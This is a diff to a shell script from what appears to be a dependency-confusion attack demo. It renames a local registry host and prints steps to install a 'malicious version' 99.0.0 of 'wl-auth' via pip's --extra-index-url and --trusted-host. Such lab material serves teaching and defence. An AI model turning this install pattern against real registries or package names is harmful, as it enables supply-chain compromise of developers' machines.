@@ -19,11 +19,11 @@ echo "  =================================================="
 echo ""
 echo "  Target package: wl-auth"
 echo "  Malicious version: 99.0.0"
-echo "  Target registry: public PyPI (http://public-pypi:8080)"
+echo "  Target registry: public PyPI (http://pypi-public:8080)"
 echo ""
 
 # Check if already published
-if curl -sf http://public-pypi:8080/simple/wl-auth/ 2>/dev/null | grep -q "wl-auth"; then
+if curl -sf http://pypi-public:8080/simple/wl-auth/ 2>/dev/null | grep -q "wl-auth"; then
     echo "  [!] Package already exists on public PyPI."
     echo "  [!] The attack is ready. Run pip install to trigger it."
 else
@@ -33,8 +33,8 @@ fi
 
 echo ""
 echo "  Check it yourself:"
-echo "    curl -s http://public-pypi:8080/simple/wl-auth/"
+echo "    curl -s http://pypi-public:8080/simple/wl-auth/"
 echo ""
 echo "  Now run pip install with --extra-index-url to see the attack:"
-echo "    pip install wl-auth --extra-index-url http://public-pypi:8080/simple/ --trusted-host public-pypi"
+echo "    pip install wl-auth --extra-index-url http://pypi-public:8080/simple/ --trusted-host pypi-public"
 echo ""
